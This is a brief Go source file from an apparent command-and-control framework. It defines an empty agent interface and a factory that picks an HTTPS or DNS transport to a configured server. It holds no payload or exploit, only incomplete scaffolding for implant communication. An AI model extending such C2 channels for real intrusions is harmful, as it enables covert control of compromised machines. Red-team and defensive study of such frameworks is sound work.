package agent

import (
	"fmt"

	"c2framework/internals/config"
)

// Agent defines the contract for agents
type Agent interface {
	// Send sends a message and waits for a response
	// TODO: Send(ctx context.Context)  now returns a json.RawMessage and error
}

// NewAgent creates a new agent based on the protocol
func NewAgent(cfg *config.AgentConfig) (Agent, error) {
	switch cfg.Protocol {
	case "https":
		return NewHTTPSAgent(cfg.ServerIP, cfg.ServerPort, cfg.SharedSecret), nil
	case "dns":
		return NewDNSAgent(cfg.ServerIP, cfg.ServerPort), nil
	default:
		return nil, fmt.Errorf("unsupported protocol: %v", cfg.Protocol)
	}
}
